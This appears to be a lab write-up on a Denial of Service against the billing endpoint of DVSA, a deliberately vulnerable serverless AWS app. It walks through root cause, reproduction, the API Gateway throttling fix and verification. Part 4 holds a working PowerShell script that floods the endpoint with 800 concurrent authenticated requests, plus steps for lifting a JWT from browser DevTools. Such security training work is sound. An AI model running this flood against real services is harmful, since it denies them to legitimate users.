# Lesson #6: Denial of Service (DoS)

## Overview

| Field | Details |
|-------|---------|
| **Vulnerability** | Denial of Service (DoS) |
| **Affected Component** | DVSA-ORDER-BILLING Lambda + API Gateway (dvsa stage) |
| **API Endpoint** | `POST https://me1rgsk700.execute-api.us-east-1.amazonaws.com/dvsa/order` |
| **Impact** | Availability loss — legitimate users cannot complete checkout |
| **Root Cause** | No rate limiting, throttling, or concurrency controls on billing endpoint |

---

## Part 1: Goal and Vulnerability Summary

The billing endpoint in DVSA has no rate limiting or abuse protection. By sending a large number of concurrent billing requests, an attacker can exhaust Lambda concurrency, causing throttling errors for legitimate users attempting to complete checkout. The root cause is the complete absence of any rate limiting at the API Gateway level and no reserved concurrency cap at the Lambda level.

---

## Part 2: Root Cause

AWS Lambda enforces a default regional concurrency limit. Each billing request occupies one concurrent execution slot. Because no rate limiting exists at API Gateway and no concurrency cap exists at Lambda, nothing prevents flooding the endpoint with hundreds of parallel requests simultaneously.

---

## Part 3: Environment and Setup

**Prerequisites:**
- Valid DVSA user account
- JWT token (captured from browser DevTools)
- PowerShell (Windows)
- Postman

**Get JWT Token:**
1. Open DVSA website in browser
2. Log in to your account
3. Press F12 → Network tab → Fetch/XHR
4. Click Orders in DVSA menu
5. Copy the Authorization header value

**Set Variables in PowerShell:**
```powershell
$api = "https://me1rgsk700.execute-api.us-east-1.amazonaws.com/dvsa/order"
$token = "YOUR-JWT-TOKEN-HERE"
```

---

## Part 4: Reproduction Steps

### Step 1: Confirm Normal Billing

Send one billing request in Postman:
```json
{
  "action": "billing",
  "order-id": "YOUR-ORDER-ID",
  "data": {
    "ccn": "4242424242424242",
    "exp": "12/26",
    "cvv": "123"
  }
}
```
Expected result: `200 OK` with `status: ok` and `amount` field.

### Step 2: Demonstrate No Rate Limiting

Send 4 billing requests rapidly in Postman. All return `200 OK` with no throttling, no `429` errors, and no blocking.

### Step 3: Launch DoS Flood

Run the flood script from `exploit/dos_flood.ps1`:

```powershell
$jobs = @()
foreach ($i in 1..800) {
    $job = Start-Job -ScriptBlock {
        param($api, $token, $orderId)
        try {
            Invoke-WebRequest -Uri $api -Method POST `
                -Headers @{"Content-Type"="application/json"; "authorization"=$token} `
                -Body "{`"action`":`"billing`",`"order-id`":`"$orderId`",`"data`":{`"ccn`":`"4242424242424242`",`"exp`":`"12/26`",`"cvv`":`"123`"}}" `
                -UseBasicParsing | Out-Null
        } catch {}
    } -ArgumentList $api, $token, $orderId
    $jobs += $job
}
Write-Host "Jobs: $($jobs.Count)"
$jobs | Wait-Job | Out-Null
$jobs | Remove-Job
Write-Host "Attack finished. 800 requests sent."
```

**Result:** 800 concurrent jobs overwhelmed the system, producing `System.OutOfMemoryException`, confirming the endpoint can be flooded with no protection.

### Step 4: Check CloudWatch Metrics

1. AWS Console → CloudWatch → All Metrics → Lambda → DVSA-ORDER-BILLING
2. Check Invocations, Throttles, Errors
3. Observe spikes during attack

---

## Part 5: Evidence and Proof

- Normal billing returns `200 OK` with no restrictions
- 4 rapid requests all return `200 OK` with no throttling
- 800 concurrent jobs caused `System.OutOfMemoryException`
- CloudWatch metrics showed spikes in Invocations, Throttles, and Errors

---

## Part 6: Fix Strategy

Apply rate limiting at the API Gateway level:
- **API Gateway Stage Throttling:** Enable with Rate and Burst limits
- **Lambda Reserved Concurrency:** Set concurrency cap on DVSA-ORDER-BILLING
- **SQS Queue (ideal):** Decouple billing requests from processing

---

## Part 7: Fix Applied

**Location:** AWS Console → API Gateway → DVSA-APIs → Stages → dvsa → Edit

| Setting | Before | After |
|---------|--------|-------|
| Throttling | Inactive | **Enabled** |
| Rate | 10,000 req/sec (default) | **100 req/sec** |
| Burst | 5,000 (default) | **50 requests** |

No code changes required — pure infrastructure configuration.

---

## Part 8: Verification After Fix

After applying throttling:
- Re-ran 800-request flood → requests now receive HTTP 429 immediately
- CloudWatch shows Throttles spiking (requests rejected by API Gateway)
- Single legitimate billing request still returns `200 OK` ✅

---

## Part 10: Takeaway

Availability is a security property. In serverless architectures, unprotected endpoints can be flooded to exhaust Lambda concurrency and deny service to legitimate users. A simple API Gateway throttling configuration — 100 req/sec with burst of 50 — is sufficient to prevent this attack while preserving normal functionality.
